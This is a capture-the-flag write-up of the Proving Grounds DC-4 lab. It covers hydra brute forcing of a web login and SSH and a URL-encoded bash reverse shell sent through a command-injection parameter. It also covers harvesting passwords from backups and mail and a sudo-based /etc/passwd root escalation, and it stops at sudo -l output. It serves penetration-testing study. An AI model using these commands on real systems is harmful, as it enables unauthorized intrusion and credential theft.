## Introduction

This is a **Proving Grounds** room which can be found at: <a href="https://portal.offensive-security.com/labs/play" target="_blank">DC-4</a>

A double edged sword

## Reconnaissance & Scanning

Perform `nmap` scan to identify open ports and services.
- Command: `nmap -p- -T4 -v 192.168.142.195`


```shell

## Exploitation


The most interesting file is `command.php` but leads to `index.php`, so maybe we have to be authenticated in order to view it.

Now we `brute force` the `admin` user using `hydra` and if the success message contains the word `command`, then we have successfully brute forced the password.
- Command: `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.142.195 http-post-form "/login.php:username=^USER^&password=^PASS^:S=command"`

```shell
geobour98@kali:~$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.142.195 http-post-form "/login.php:username=^USER^&password=^PASS^:S=command"
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

```

Now we can login with username `admin` and the found password, and navigate to `/command.php`.

Here we can execute some commands from the UI, but if we `Intercept` a request with Burp Suite, we see it is a POST request with a parameter `radio`, which executes `linux` commands. So we can put there a bash reverse shell like the following: `bash -c 'exec bash -i &>/dev/tcp/192.168.49.117/443 <&1'`, but we have to URL-encode it first. The request in Burp Suite should look like this:


```shell
POST /command.php HTTP/1.1
Host: 192.168.142.195
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

radio=bash+-c+'exec+bash+-i+%26>/dev/tcp/192.168.49.142/443+<%261'&submit=Run
```

Open a netcat listener and we get a reverse shell as `www-data`.

```shell
listening on [any] 443 ...

www-data@dc-4:/usr/share/nginx/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Navigate to `/home/jim` and we see `local.txt`. Also, we see an interesting folder `backups`, which contains the file `old-passwords.bak`.


```shell
www-data@dc-4:/home/jim$ cat local.txt 
[REDACTED]
www-data@dc-4:/home/jim$ cd backups
www-data@dc-4:/home/jim/backups$ ls 
old-passwords.bak
```

Then, transfer `old-passwords.bak` to the attacker machine and `brute force` the user `jim` with the found wordlist. We will use `hydra` again.
- Command: `hydra -l jim -P old-passwords.bak ssh://192.168.142.195`

```shell
geobour98@kali:~$ hydra -l jim -P old-passwords.bak ssh://192.168.142.195

```


Now we can login with `SSH` as the user `jim` with the found password.

```shell
geobour98@kali:~$ ssh jim@192.168.142.195

jim@dc-4:~$
```

Then, we run `find` command to find files owned by `jim`. The most interesting is `/var/mail/jim`, which contains the password of user `charles`. So, we switch to that user.

```shell
jim@dc-4:~$ find / -type f -user jim 2>/dev/null
[REDACTED]
/var/mail/jim
[REDACTED]
jim@dc-4:~$ cat /var/mail/jim

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anyt
hing goes wrong.

jim@dc-4:~$ su charles
Password:

```

## Privilege Escalation


After executing the command: `sudo -l` we see that we can execute `/usr/bin/teehee` as `root`. If we run `strings` command on `/usr/bin/teehee` we will find the help menu of that binary. 

Then we can execute it with the `-a` option to append a new user with both GID and UID as 0 (as `root`) at `/etc/passwd`.

Before running `/usr/bin/teehee` we must generate a hash of a password (geobour98 in my case) with `openssl` in order to put it in `/etc/passwd`.


```shell
charles@dc-4:~$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
